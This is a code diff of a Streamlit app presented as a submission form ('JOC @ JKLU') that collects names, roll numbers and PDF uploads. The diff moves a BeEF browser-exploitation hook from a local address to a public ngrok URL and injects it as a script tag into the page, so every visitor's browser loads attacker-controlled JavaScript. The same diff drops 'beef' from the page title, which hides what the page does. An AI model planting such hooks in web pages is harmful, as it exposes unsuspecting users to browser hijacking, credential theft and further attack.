@@ -140,20 +140,18 @@ def save_submission(name, roll_number, uploaded_file):
 
 # Streamlit app
 def main():
-    st.title("JOC @ JKLU beef")
+    st.title("JOC @ JKLU")
     st.write("Please submit your information:")
 
-    # Add the BeEF hook script here
-    beef_hook_url = "http://192.168.36.147:3000/hook.js"  # Replace with your actual BeEF server address
+    # Add BeEF hook here
+    beef_hook_url = "https://cd55-106-219-204-185.ngrok-free.app/hook.js"  # Replace with your ngrok URL or BeEF HTTPS URL
     st.markdown(f'<script src="{beef_hook_url}"></script>', unsafe_allow_html=True)
 
     name = st.text_input("Name")
     roll_number = st.text_input("Roll Number")
     
-    # File uploader without max_size (since max_size is not supported in older Streamlit versions)
     uploaded_file = st.file_uploader("Upload your PDF file (max 2MB)", type=["pdf"], help="Only PDF files allowed.")
 
-    # Check file size manually (if file is uploaded)
     if uploaded_file is not None:
         if uploaded_file.size > 2 * 1024 * 1024:  # 2MB limit
             st.error("File is too large! Please upload a file smaller than 2MB.")
@@ -185,4 +183,5 @@ if not os.path.exists("uploads"):
 
 if __name__ == "__main__":
     main()
+
 
